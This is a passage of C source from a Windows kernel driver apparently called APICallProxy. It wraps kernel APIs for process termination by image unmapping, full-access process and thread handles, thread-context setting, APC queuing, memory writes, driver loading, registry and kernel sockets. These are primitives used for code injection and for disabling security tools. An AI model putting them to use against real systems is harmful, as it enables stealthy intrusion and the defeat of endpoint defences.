NTSTATUS APIProxyRecv(SendRecvStruct* RecvInfo) {
    NTSTATUS Status;

   
    PVOID RecvData =  (PVOID)ExAllocatePoolWithTag(PagedPool, RecvInfo->BufferLen, MEMORY_TAG);
    if (!RecvData) {
        return STATUS_NO_MEMORY;
    }

    RtlZeroMemory(RecvData, RecvInfo->BufferLen);
    ULONG Length = (ULONG)RecvInfo->BufferLen;
    
    Status = KsRecv((PKSOCKET)RecvInfo->Socket, (PVOID)RecvData, &Length, 0);

    RtlCopyMemory(RecvInfo->Buffer, RecvData, RecvInfo->BufferLen);
    ExFreePoolWithTag(RecvData, MEMORY_TAG);
     
    return Status;
}

```

`APICallProxy/APICallProxy/Process.h`:

```h
#pragma once


NTSTATUS APIProxyTerminateProcess(DWORD64* PID) {
	NTSTATUS Status = STATUS_SUCCESS;
	PEPROCESS Process;

	__try {

		Status = PsLookupProcessByProcessId((HANDLE)(*PID), &Process);

		if (!NT_SUCCESS(Status)) {
			return Status;
		}

		Status = MmUnmapViewOfSection(Process, PsGetProcessSectionBaseAddress(Process)); // Get the base address of process's executable image and unmap it

#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Terminate Process PID[%d] Status Code 0x%x\n", *PID, Status);
		}
#endif 

		ObDereferenceObject(Process); // Dereference the target process
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Terminating process Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyOpenProcess(HANDLE* PID, HANDLE* ProcessHandle) {

	NTSTATUS Status = STATUS_SUCCESS;
	CLIENT_ID ClientID;
	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
	Status = STATUS_UNSUCCESSFUL;

	__try {
		DWORD64 TID = APIProxyGetAnyTIDFromPID((DWORD64)(*PID));

		if (TID == 0) {
			return Status;
		}
		InitializeObjectAttributes(&objAttr,
			NULL,
			OBJ_KERNEL_HANDLE,
			NULL,
			NULL);
		ClientID.UniqueProcess = *PID;
		ClientID.UniqueThread = (HANDLE)TID;
		Status = ZwOpenProcess(ProcessHandle, PROCESS_ALL_ACCESS, &objAttr, &ClientID);
#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Open Process Status Code 0x%x\n", Status);
		}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Opening process Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxySuspendProcess(HANDLE* ProcessHandle) {
	NTSTATUS Status = STATUS_SUCCESS;
	__try {
		PEPROCESS Process;
		Status = ObReferenceObjectByHandle(*ProcessHandle, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, (PVOID*)&Process, NULL);
		//Status = PsLookupProcessByProcessId(*PID, &Process);
		if (NT_SUCCESS(Status)) {
			Status = PsSuspendProcess(Process);
			ObDereferenceObject(Process);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Suspend Process Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyResumeProcess(HANDLE* ProcessHandle) {
	NTSTATUS Status = STATUS_SUCCESS;
	__try {
		PEPROCESS Process;
		Status = ObReferenceObjectByHandle(*ProcessHandle, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, (PVOID*)&Process, NULL);
		//Status = PsLookupProcessByProcessId(*PID, &Process);
		if (NT_SUCCESS(Status)) {
			Status = PsResumeProcess(Process);
			ObDereferenceObject(Process);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Resume Process Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}


```

`APICallProxy/APICallProxy/Prototypes.h`:

```h
#pragma once

EXTERN_C_START

DRIVER_INITIALIZE DriverEntry;
NTSTATUS NTAPI ZwQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
NTSTATUS NTAPI 	PsSuspendProcess(IN PEPROCESS Process);
NTSTATUS NTAPI 	PsResumeProcess(IN PEPROCESS Process);
PVOID NTAPI PsGetProcessSectionBaseAddress(PEPROCESS Process); // Used to get the base address of process's executable image
NTSTATUS NTAPI MmUnmapViewOfSection(PEPROCESS Process, PVOID BaseAddress); // Used to unmap process's executable image
NTSTATUS  NTAPI ZwOpenThread(PHANDLE ThreadHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);

NTSTATUS NTAPI MmCopyVirtualMemory(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess, PVOID TargetAddress, SIZE_T BufferSize,
	KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);

NTSTATUS NTAPI PsGetContextThread(IN PETHREAD Thread, IN OUT PCONTEXT ThreadContext, IN KPROCESSOR_MODE PreviousMode);
NTSTATUS NTAPI PsSetContextThread(IN PETHREAD Thread, IN PCONTEXT ThreadContext, IN KPROCESSOR_MODE PreviousMode);
NTSTATUS ZwProtectVirtualMemory(IN HANDLE ProcessHandle, IN PVOID* BaseAddress, IN SIZE_T* NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);


VOID NTAPI KeInitializeApc(
	_Out_ PRKAPC Apc,
	_In_ PETHREAD Thread,
	_In_ KAPC_ENVIRONMENT Environment,
	_In_ PKKERNEL_ROUTINE KernelRoutine,
	_In_opt_ PKRUNDOWN_ROUTINE RundownRoutine,
	_In_opt_ PKNORMAL_ROUTINE NormalRoutine,
	_In_opt_ KPROCESSOR_MODE ApcMode,
	_In_opt_ PVOID NormalContext
);

BOOLEAN NTAPI KeTestAlertThread(IN  KPROCESSOR_MODE AlertMode);

BOOLEAN NTAPI KeInsertQueueApc(_Inout_ PRKAPC Apc, _In_opt_ PVOID SystemArgument1, _In_opt_ PVOID SystemArgument2, _In_ KPRIORITY Increment);

EXTERN_C_END

// prototypes
void APIProxyUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS APIProxyCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS APIProxyDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);


//General.h
NTSTATUS APIProxyCloseHandle(_In_ HANDLE* FileHandle);
NTSTATUS APIProxyAllocateVirtualMemory(_In_ AllocateVirtualMeomryInfo* AllocateMemoryInfo);
NTSTATUS APIProxyProtectVirtualMemory(_In_ VirtualProtectInfo* MemoryProtectionInfo);
NTSTATUS APIProxyReadVirtualMemory(_Out_ ReadWriteVirtualMemoryInfo* ReadMemoryInfo);
NTSTATUS APIProxyWriteVirtualMemory(_In_ ReadWriteVirtualMemoryInfo* WriteMemoryInfo);
NTSTATUS APIProxyQuerySystemInformation(_In_ ULONG InformationClass, _Out_ PVOID InformationData, _In_ ULONG* DataSize);
NTSTATUS APIProxyQueueUserAPC(_In_ QueueUSerApcInfo* APCInfo);
NTSTATUS APIProxyFreeVirtualMemory(_In_ FreeVirtualMeomryInfo* FreeMemoryInfo);
NTSTATUS APIProxyUnLoadDriver(_In_ PUNICODE_STRING DriverRegistryPath);
NTSTATUS APIProxyLoadDriver(_In_ PUNICODE_STRING DriverRegistryPath);

//FileSystem.h
NTSTATUS APIProxyCreateFile(_In_ CreateFileInfo* FileInfo, _Out_ HANDLE* FileHandle);
NTSTATUS APIProxyOpenFile(_In_ CreateFileInfo* FileInfo, _Out_ HANDLE* FileHandle);
NTSTATUS APIProxyDeleteFile(_In_ WCHAR* FileName);
NTSTATUS APIProxyWriteFile(_In_ ReadWriteData* WriteInfo);
NTSTATUS APIProxyReadFile(_Inout_ ReadWriteData* ReadInfo);
NTSTATUS APIProxyGetFileSize(_In_ HANDLE* FileHandle, _Out_ FILE_STANDARD_INFORMATION* FileInfo);
NTSTATUS APIProxyCreateSection(_In_ CreateSectionInfo* SectionInfo, _Out_ HANDLE* SectionHandle);
NTSTATUS APIProxyOpenSection(_In_ OpenSectionInfo* SectionInfo, _Out_ HANDLE* SectionHandle);
NTSTATUS APIProxyMapViewOfSection(_In_ MapViewOfSectionInfo* MapInfo);
NTSTATUS APIProxyUnMapViewOfSection(_In_ UNMapViewOfSectionInfo* UnMapInfo);


//Thread.h
NTSTATUS APIProxyOpenThread(_In_ HANDLE* TID, _Out_ HANDLE* ThreadHandle);
NTSTATUS APIProxySetThreadContext(_In_ ThreadContextInfo* ThreadInfo);
NTSTATUS APIProxyGetThreadContext(_Out_ ThreadContextInfo* ThreadInfo);


//Process.h
NTSTATUS APIProxyTerminateProcess(_In_ DWORD64* PID);
NTSTATUS APIProxyOpenProcess(_In_ HANDLE* PID, _Out_ HANDLE* ProcessHandle);
NTSTATUS APIProxySuspendProcess(_In_ HANDLE* PID);
NTSTATUS APIProxyResumeProcess(_In_ HANDLE* PID);

//Registry.h
NTSTATUS APIProxyCreateKey(_In_ OpenCreateRegistryInfo* CreateKeyInfo, _Out_ HANDLE* NewKeyHandle);
NTSTATUS APIProxyOpenKey(_In_ OpenCreateRegistryInfo* OpenKeyInfo, _Out_ HANDLE* NewKeyHandle);
NTSTATUS APIProxyDeleteRegistryKey(_In_ HANDLE KeyHandle);
NTSTATUS APIProxyRegistrySetValue(_In_ RegistrySetValueInfo* SetValueInfo);
NTSTATUS APIProxyRegistryQueryValue(_In_ RegistryQueryKeyValueInfo* QueryValueInfo);

//Network.h
DWORD32 APIProxyhtonl(DWORD32 hostlong);
unsigned short APIProxyhtons(unsigned short hostshort);
DWORD32 APIProxyntohl(DWORD32 netlong);
unsigned short  APIProxyntohs(unsigned short netshort);
NTSTATUS  APIProxyWSAStartup(OUT WSAStartCleanUp* WSASInfo);
NTSTATUS APIProxyWSACleanup(_In_ WSAStartCleanUp* WSASInfo);
NTSTATUS APIProxtGetAddrInfo(GetAddrInfoStruct* AddrInfo);
NTSTATUS APIProxyFreeAddrInfo(struct addrinfo* AddrInfo);
NTSTATUS APIProxySocket(WSAStartCleanUp* WSAInfo, PKSOCKET* Socket, int Domain, int Type, int Protocol, _In_ ULONG Flags);
NTSTATUS APIProxyCloseSocket(PKSOCKET Socket);
NTSTATUS APIProxyConnect(ConnectStruct* ConnectInfo);
NTSTATUS APIProxyListen();
NTSTATUS APIProxyBind(BindStruct* BindInfo);
NTSTATUS APIProxyAccept(AcceptStruct* AcceptInfo);
NTSTATUS APIProxySend(SendRecvStruct* SendInfo);
NTSTATUS APIProxyRecv(SendRecvStruct* RecvInfo);


//Utility.h
DWORD64  APIProxyGetPIDFromProcessName(WCHAR* ProcessName);
DWORD64  APIProxyGetAnyTIDFromPID(DWORD64 PID);
VOID  APIProxyApcKernelRoutine(_In_ PKAPC Apc, _Inout_ PKNORMAL_ROUTINE* NormalRoutine, _Inout_ PVOID* NormalContext, _Inout_ PVOID* SystemArgument1, _Inout_ PVOID* SystemArgument2);
VOID  APIProxyApcAlertThread(_In_ PKAPC Apc, _Inout_ PKNORMAL_ROUTINE* NormalRoutine, _Inout_ PVOID* NormalContext, _Inout_ PVOID* SystemArgument1, _Inout_ PVOID* SystemArgument2);

DWORD32 APIProxyhtonl(DWORD32 hostlong);
unsigned short APIProxyhtons(unsigned short hostshort);
DWORD32 APIProxyntohl(DWORD32 netlong);
unsigned short APIProxyntohs(unsigned short netshort);

NTSTATUS APIProxyAsyncContextCompletionRoutine(
    _In_ PDEVICE_OBJECT	DeviceObject,
    _In_ PIRP Irp,
    _In_ PKEVENT CompletionEvent
);

NTSTATUS APIProxyAsyncContextAllocate(_Out_ PKSOCKET_ASYNC_CONTEXT AsyncContext);
VOID APIProxyAsyncContextFree(_In_ PKSOCKET_ASYNC_CONTEXT AsyncContext);
VOID APIProxyAsyncContextReset(_In_ PKSOCKET_ASYNC_CONTEXT AsyncContext);

NTSTATUS APIProxyAsyncContextWaitForCompletion(
    _In_ PKSOCKET_ASYNC_CONTEXT AsyncContext,
    _Inout_ PNTSTATUS Status
);

NTSTATUS APIProxyAddrInfoToAddrInfoEx(
    _In_ PADDRINFOA AddrInfo,
    _Out_ PADDRINFOEXW* AddrInfoEx
);

NTSTATUS APIProxyAddrInfoExToAddrInfo(
    _In_ PADDRINFOEXW AddrInfoEx,
    _Out_ PADDRINFOA* AddrInfo
);

VOID APIProxyFreeAddrInfoUtility(_In_ PADDRINFOA AddrInfo);
VOID APIProxyFreeAddrInfoEx(_In_ PADDRINFOEXW AddrInfo);

NTSTATUS KsGetAddrInfo(
    WSAStartCleanUp* WSAInfo,
    _In_ PUNICODE_STRING NodeName,
    _In_ PUNICODE_STRING ServiceName,
    _In_ PADDRINFOEXW Hints,
    _Out_ PADDRINFOEXW* Result
);

VOID KsFreeAddrInfo(
    WSAStartCleanUp* WSAInfo,
    _In_ PADDRINFOEXW AddrInfo
);

NTSTATUS KsCreateSocket(
    WSAStartCleanUp* WSAInfo,
    _Out_ PKSOCKET* Socket,
    _In_ ADDRESS_FAMILY AddressFamily,
    _In_ USHORT SocketType,
    _In_ ULONG Protocol,
    _In_ ULONG Flags
);

NTSTATUS KsCloseSocket(_In_ PKSOCKET Socket);

//TODO: Make the Bind work for all type of socket
NTSTATUS KsBind(_In_ PKSOCKET Socket, _In_ PSOCKADDR LocalAddress);

NTSTATUS KsAccept(
    _In_ PKSOCKET Socket,
    _Out_ PKSOCKET* NewSocket,
    _Out_opt_ PSOCKADDR LocalAddress,
    _Out_opt_ PSOCKADDR RemoteAddress);

NTSTATUS KsConnect(_In_ PKSOCKET Socket, _In_ PSOCKADDR RemoteAddress);

NTSTATUS KsSendRecv(
    _In_ PKSOCKET Socket,
    _In_ PVOID Buffer,
    _Inout_ PULONG Length,
    _In_ ULONG Flags,
    _In_ BOOLEAN Send
);

NTSTATUS KsSend(
    _In_ PKSOCKET Socket,
    _In_ PVOID Buffer,
    _Inout_ PULONG Length,
    _In_ ULONG Flags
);

NTSTATUS KsRecv(
    _In_ PKSOCKET Socket,
    _In_ PVOID Buffer,
    _Inout_ PULONG Length,
    _In_ ULONG Flags
);

```

`APICallProxy/APICallProxy/Registry.h`:

```h
#pragma once


NTSTATUS APIProxyCreateKey(_In_ OpenCreateRegistryInfo* CreateKeyInfo, _Inout_ HANDLE* NewKeyHandle) {

	OBJECT_ATTRIBUTES objectAttributes;
	UNICODE_STRING name;
	ULONG Disposition;
	NTSTATUS Status = STATUS_SUCCESS;

	__try {
	RtlInitUnicodeString(&name, CreateKeyInfo->RegistryKeyPath);
	InitializeObjectAttributes(&objectAttributes, &name, OBJ_KERNEL_HANDLE, NULL, NULL);

	Status = ZwCreateKey(
		NewKeyHandle,
		CreateKeyInfo->DesiredAccess,
		&objectAttributes,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		&Disposition);

#if DEBUG
	if (!NT_SUCCESS(Status)) {
		DbgPrint("APICallProxy: Error Create Registry Key Status Code 0x%x\n", Status);
	}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Create Registry Key Status Code 0x%x\n", Status);

#endif

	}

	return Status;
}

NTSTATUS APIProxyOpenKey(_In_ OpenCreateRegistryInfo* OpenKeyInfo, _Inout_ HANDLE* NewKeyHandle) {

	OBJECT_ATTRIBUTES objectAttributes;
	UNICODE_STRING name;
	NTSTATUS Status = STATUS_SUCCESS;

	__try {

		RtlInitUnicodeString(&name, OpenKeyInfo->RegistryKeyPath);
		InitializeObjectAttributes(&objectAttributes, &name, OBJ_KERNEL_HANDLE, NULL, NULL);

		Status = ZwOpenKey(NewKeyHandle, OpenKeyInfo->DesiredAccess, &objectAttributes);

#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Open Registry Key Status Code 0x%x\n", Status);
		}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Open Registry Key Status Code 0x%x\n", Status);

#endif

	}

	return Status;
}

NTSTATUS APIProxyDeleteRegistryKey(_In_ HANDLE KeyHandle) {

	NTSTATUS Status = STATUS_SUCCESS;

	__try {

		Status = ZwDeleteKey(KeyHandle);

#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Delete Registry Key Status Code 0x%x\n", Status);
		}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Delete Registry Key Status Code 0x%x\n", Status);

#endif

	}

	return Status;
}

NTSTATUS APIProxyRegistrySetValue(_In_ RegistrySetValueInfo* SetValueInfo) {

	UNICODE_STRING ValueName;
	NTSTATUS Status = STATUS_SUCCESS;

	__try {

		RtlInitUnicodeString(&ValueName, SetValueInfo->KeyName);
		Status = ZwSetValueKey(
			SetValueInfo->KeyHandle,
			&ValueName,
			0,
			SetValueInfo->Type,
			SetValueInfo->Date,
			SetValueInfo->DateSize);

#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Set Registry Key Status Code 0x%x\n", Status);
		}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Setting Registry Key Status Code 0x%x\n", Status);

#endif

	}

	return Status;
}

NTSTATUS APIProxyRegistryQueryValue(_In_ RegistryQueryKeyValueInfo* QueryValueInfo) {

	UNICODE_STRING ValueName;
	NTSTATUS Status = STATUS_SUCCESS;

	__try {


		RtlInitUnicodeString(&ValueName, QueryValueInfo->ValueName);
		Status = ZwQueryValueKey(
			QueryValueInfo->KeyHandle, 
			&ValueName, 
			(KEY_VALUE_INFORMATION_CLASS)QueryValueInfo->KeyValueInformationClass,
			QueryValueInfo->Data,
			QueryValueInfo->DateSize,
			QueryValueInfo->ResultLength);

#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Query Registry Key Status Code 0x%x\n", Status);
		}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Query Registry Key Status Code 0x%x\n", Status);

#endif

	}

	return Status;
}
```

`APICallProxy/APICallProxy/Struct.h`:

```h
#pragma once

#define DEBUG 0

#define BYTE unsigned char

typedef enum _KAPC_ENVIRONMENT
{
    OriginalApcEnvironment,
    AttachedApcEnvironment,
    CurrentApcEnvironment,
    InsertApcEnvironment
} KAPC_ENVIRONMENT;

typedef
VOID
(NTAPI* PKNORMAL_ROUTINE)(
    _In_ PVOID NormalContext,
    _In_ PVOID SystemArgument1,
    _In_ PVOID SystemArgument2
    );

typedef
VOID
(NTAPI* PKKERNEL_ROUTINE)(
    _In_ PKAPC Apc,
    _Inout_ PKNORMAL_ROUTINE* NormalRoutine,
    _Inout_ PVOID* NormalContext,
    _Inout_ PVOID* SystemArgument1,
    _Inout_ PVOID* SystemArgument2
    );

typedef
VOID
(NTAPI* PKRUNDOWN_ROUTINE) (
    _In_ PKAPC Apc
    );


typedef struct _SYSTEM_THREADS {
    LARGE_INTEGER  KernelTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  CreateTime;
    ULONG          WaitTime;
    PVOID          StartAddress;
    CLIENT_ID      ClientId;
    KPRIORITY      Priority;
    KPRIORITY      BasePriority;
    ULONG          ContextSwitchCount;
    LONG           State;
    LONG           WaitReason;
} SYSTEM_THREADS, * PSYSTEM_THREADS;

typedef struct _SYSTEM_PROCESSES {
    ULONG            NextEntryDelta;
    ULONG            ThreadCount;
    ULONG            Reserved1[6];
    LARGE_INTEGER    CreateTime;
    LARGE_INTEGER    UserTime;
    LARGE_INTEGER    KernelTime;
    UNICODE_STRING   ProcessName;
    KPRIORITY        BasePriority;
    SIZE_T           ProcessId;
    SIZE_T           InheritedFromProcessId;
    ULONG            HandleCount;
    ULONG            Reserved2[2];
    VM_COUNTERS      VmCounters;

    ULONG PrivatePageCount;// add by achillis

    IO_COUNTERS      IoCounters;
    SYSTEM_THREADS   Threads[1];
} SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;

#define SystemProcessInformation 5



typedef struct _SYSTEM_BASIC_INFORMATION
{
    ULONG Reserved;
    ULONG TimerResolution;
    ULONG PageSize;
    ULONG NumberOfPhysicalPages;
    ULONG LowestPhysicalPageNumber;
    ULONG HighestPhysicalPageNumber;
    ULONG AllocationGranularity;
    ULONG_PTR MinimumUserModeAddress;
    ULONG_PTR MaximumUserModeAddress;
    ULONG_PTR ActiveProcessorsAffinityMask;
    CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, * PSYSTEM_BASIC_INFORMATION;

#define SystemBasicInformation 0

//Network Struct

#define MEMORY_TAG            'API '

typedef int       socklen_t;
typedef intptr_t  ssize_t;

typedef struct _KSOCKET_ASYNC_CONTEXT
{
    KEVENT CompletionEvent;
    PIRP Irp;
} KSOCKET_ASYNC_CONTEXT, * PKSOCKET_ASYNC_CONTEXT;

typedef struct _KSOCKET
{
    PWSK_SOCKET	WskSocket;

    union
    {
        PVOID WskDispatch;

        PWSK_PROVIDER_CONNECTION_DISPATCH WskConnectionDispatch;
        PWSK_PROVIDER_LISTEN_DISPATCH WskListenDispatch;
        PWSK_PROVIDER_DATAGRAM_DISPATCH WskDatagramDispatch;
#if (NTDDI_VERSION >= NTDDI_WIN10_RS2)
        PWSK_PROVIDER_STREAM_DISPATCH WskStreamDispatch;
#endif
    };

    KSOCKET_ASYNC_CONTEXT AsyncContext;
} KSOCKET, * PKSOCKET;

typedef struct _KSOCKET KSOCKET, * PKSOCKET;
```

`APICallProxy/APICallProxy/Thread.h`:

```h
#pragma once

NTSTATUS APIProxyOpenThread(HANDLE* TID, HANDLE* ThreadHandle) {
	CLIENT_ID ClientID;
	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
	NTSTATUS Status = STATUS_SUCCESS;

	__try {
		InitializeObjectAttributes(&objAttr,
			NULL,
			OBJ_KERNEL_HANDLE,
			NULL,
			NULL);
		ClientID.UniqueProcess = 0;
		ClientID.UniqueThread = *TID;
		Status = ZwOpenThread(ThreadHandle, PROCESS_ALL_ACCESS, &objAttr, &ClientID);
#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Open Thread Status Code 0x%x\n", Status);
		}
#endif 
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Opening Thread Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyGetThreadContext(ThreadContextInfo* ThreadInfo) {
	NTSTATUS Status = STATUS_SUCCESS;
	PETHREAD pThread;

	__try {

	Status = PsLookupThreadByThreadId((HANDLE)ThreadInfo->ThreadID, &pThread);
	if (!NT_SUCCESS(Status)) {
		return Status;
	}
	Status = PsGetContextThread(pThread, &ThreadInfo->ThreadContext, UserMode);
	ObDereferenceObject(pThread);

#if DEBUG
	if (!NT_SUCCESS(Status)) {
		DbgPrint("APICallProxy: Error Get Thread Context Status Code 0x%x\n", Status);
	}
#endif 
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Get Thread Context Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxySetThreadContext(ThreadContextInfo* ThreadInfo) {
	NTSTATUS Status = STATUS_SUCCESS;
	PETHREAD pThread;

	__try {

	Status = PsLookupThreadByThreadId((HANDLE)ThreadInfo->ThreadID, &pThread);
	if (!NT_SUCCESS(Status)) {
		return Status;
	}
	Status = PsSetContextThread(pThread, &ThreadInfo->ThreadContext, UserMode);
	ObDereferenceObject(pThread);

#if DEBUG
	if (!NT_SUCCESS(Status)) {
		DbgPrint("APICallProxy: Error Set Thread Context Status Code 0x%x\n", Status);
	}
#endif 
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Set Thread Context Status Code 0x%x\n", Status);
#endif

	}

	return Status;
}
```

`APICallProxy/APICallProxy/Utility.h`:

```h
#pragma once


DWORD64 APIProxyGetPIDFromProcessName(_In_ WCHAR* ProcessName) {
	DWORD64 PID = 0;
	PSYSTEM_PROCESSES ProcessInfo = NULL;
	ULONG DataSize = 0;
	__try {
		NTSTATUS Status = APIProxyQuerySystemInformation(SystemProcessInformation, ProcessInfo, &DataSize);
		if (Status == STATUS_BUFFER_TOO_SMALL) {

			ProcessInfo = (PSYSTEM_PROCESSES)ExAllocatePool(PagedPool, DataSize);

			if (ProcessInfo) {
				Status = APIProxyQuerySystemInformation(SystemProcessInformation, ProcessInfo, &DataSize);
				if (!NT_SUCCESS(Status)) {
#if DEBUG
					DbgPrint("APICallProxy: Error Get PID From Process Name Status Code 0x%x\n", Status);
#endif 
					ExFreePool(ProcessInfo);
					return PID;
				}
			}
			else {
#if DEBUG
				DbgPrint("APICallProxy: Error Get PID From Process Name Can't allocate Memory Status Code 0x%x\n", Status);
#endif 
				return PID;
			}
		}
		else if (!NT_SUCCESS(Status)) {
#if DEBUG
			DbgPrint("APICallProxy: Error Get PID From Process Name Status Code 0x%x\n", Status);
#endif 
			return PID;
		}

		PVOID Memory = ProcessInfo;

		do {
			if (ProcessInfo->ProcessName.Length) {
				auto ProcessExist = wcsstr(ProcessInfo->ProcessName.Buffer, ProcessName);
				if (ProcessExist) {
					PID = ProcessInfo->ProcessId;
					break;
				}
			}
			ProcessInfo = (PSYSTEM_PROCESSES)((unsigned char*)ProcessInfo + ProcessInfo->NextEntryDelta);
		} while (ProcessInfo->NextEntryDelta);

		ExFreePool(Memory);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

#if DEBUG	
		DbgPrint("APICallProxy: Error Access Violation while Getting the PID from process name\n");
#endif

	}
	return PID;
}

DWORD64 APIProxyGetAnyTIDFromPID(_In_ DWORD64 PID) {
	DWORD64 TID = 0;

	PSYSTEM_PROCESSES ProcessInfo = NULL;
	ULONG DataSize = 0;
	NTSTATUS Status = APIProxyQuerySystemInformation(SystemProcessInformation, ProcessInfo, &DataSize);
	if (Status == STATUS_BUFFER_TOO_SMALL) {
		ProcessInfo = (PSYSTEM_PROCESSES)ExAllocatePool(PagedPool, DataSize);

		if (ProcessInfo) {
			Status = APIProxyQuerySystemInformation(SystemProcessInformation, ProcessInfo, &DataSize);
			if (!NT_SUCCESS(Status)) {
				//Error Happend
				ExFreePool(ProcessInfo);
				return TID;
			}
		}
	}
	else if (!NT_SUCCESS(Status)) {
		//Error Happend
		return TID;
	}

	PVOID Memory = ProcessInfo;

	do {
		if (ProcessInfo->ProcessId == PID) {
			PSYSTEM_THREADS  pSysThread = ProcessInfo->Threads;
			TID = (DWORD64)pSysThread->ClientId.UniqueThread;
			break;
		}
		ProcessInfo = (PSYSTEM_PROCESSES)((unsigned char*)ProcessInfo + ProcessInfo->NextEntryDelta);
	} while (ProcessInfo->NextEntryDelta);

	ExFreePool(Memory);
	return TID;
}

VOID APIProxyApcKernelRoutine(_In_ PKAPC Apc, _Inout_ PKNORMAL_ROUTINE* NormalRoutine, _Inout_ PVOID* NormalContext, _Inout_ PVOID* SystemArgument1, _Inout_ PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	//free the allocate KAPC Struct
	ExFreePool(Apc);
}

VOID APIProxyApcAlertThread(_In_ PKAPC Apc, _Inout_ PKNORMAL_ROUTINE* NormalRoutine, _Inout_ PVOID* NormalContext, _Inout_ PVOID* SystemArgument1, _Inout_ PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	//free the allocate KAPC Struct
	KeTestAlertThread(UserMode);
	ExFreePool(Apc);
}


///Network Utility

DWORD32 APIProxyhtonl(DWORD32 hostlong) {
    return RtlUlongByteSwap(hostlong);
}

unsigned short APIProxyhtons(unsigned short hostshort) {
    return RtlUshortByteSwap(hostshort);
}

DWORD32 APIProxyntohl(DWORD32 netlong) {
    return RtlUlongByteSwap(netlong);
}

unsigned short APIProxyntohs(unsigned short netshort) {
    return RtlUshortByteSwap(netshort);
}


NTSTATUS APIProxyAsyncContextCompletionRoutine(
    _In_ PDEVICE_OBJECT	DeviceObject,
    _In_ PIRP Irp,
    _In_ PKEVENT CompletionEvent
) {
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    KeSetEvent(CompletionEvent, IO_NO_INCREMENT, FALSE);
    return STATUS_MORE_PROCESSING_REQUIRED;
}

NTSTATUS APIProxyAsyncContextAllocate(_Out_ PKSOCKET_ASYNC_CONTEXT AsyncContext) {

    KeInitializeEvent(
        &AsyncContext->CompletionEvent,
